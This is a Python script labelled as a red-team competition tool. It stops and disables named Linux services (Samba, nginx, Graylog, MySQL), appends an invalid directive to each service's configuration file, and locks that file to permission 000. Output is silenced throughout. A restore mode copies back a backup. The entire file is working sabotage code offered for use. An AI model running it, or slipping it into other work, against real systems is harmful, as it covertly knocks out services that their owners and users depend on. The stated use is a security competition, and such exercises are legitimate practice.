#!/usr/bin/env python3
import os
import sys
import subprocess

# Author: William Faber (wfaber@rit.edu)
# Purpose: Stealthy sabotage of services for red team competition with optional verbose output and reversible changes

def inject_invalid_config(service, verbose=False):
    config_paths = {
        "smb": "/etc/samba/smb.conf",
        "nginx": "/etc/nginx/nginx.conf",
        "graylog": "/etc/graylog/server/server.conf",
        "mysql": "/etc/mysql/my.cnf"
    }

    if service not in config_paths:
        if verbose:
            print(f"[!] No config path known for {service}")
        return

    config_path = config_paths[service]
    backup_path = config_path + ".bak"

    if not os.path.exists(config_path):
        if verbose:
            print(f"[!] Config file not found: {config_path}")
        return

    # Backup original
    subprocess.run(["cp", config_path, backup_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Inject invalid config line
    with open(config_path, "a") as f:
        f.write("\n# Injected by Red Team\n")
        f.write("INVALID_DIRECTIVE;\n")

    # Lock config permissions to 000 (unreadable)
    os.chmod(config_path, 0)
    if verbose:
        print(f"[+] Injected invalid config and locked file for {service}")

def sabotage_service(service, verbose=False):
    if verbose:
        print(f"[+] Sabotaging service: {service}")
    subprocess.run(["systemctl", "stop", service], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["systemctl", "disable", service], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    inject_invalid_config(service, verbose)
    if verbose:
        print("[+] Sabotage complete.")

def restore_service(service, verbose=False):
    config_paths = {
        "smb": "/etc/samba/smb.conf",
        "nginx": "/etc/nginx/nginx.conf",
        "graylog": "/etc/graylog/server/server.conf",
        "mysql": "/etc/mysql/my.cnf"
    }

    if service not in config_paths:
        if verbose:
            print(f"[!] No config path known for {service}")
        return

    config_path = config_paths[service]
    backup_path = config_path + ".bak"

    if not os.path.exists(backup_path):
        if verbose:
            print(f"[!] No backup config found for {service}")
        return

    subprocess.run(["cp", backup_path, config_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    os.chmod(config_path, 0o644)

    # Special handling for Samba
    if service == "smb":
        subprocess.run(["systemctl", "reload", "smbd"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["systemctl", "restart", "nmbd"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        # For other services, enable and start
        subprocess.run(["systemctl", "enable", service], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["systemctl", "start", service], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if verbose:
        print(f"[+] Restored and restarted {service}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: ./service_saboteur.py <sabotage|restore> <service-name> [--verbose]")
        sys.exit(1)

    mode = sys.argv[1]
    service_name = sys.argv[2]
    verbose = "--verbose" in sys.argv

    if mode == "sabotage":
        sabotage_service(service_name, verbose)
    elif mode == "restore":
        restore_service(service_name, verbose)
    else:
        print("[!] Invalid mode. Use 'sabotage' or 'restore'")
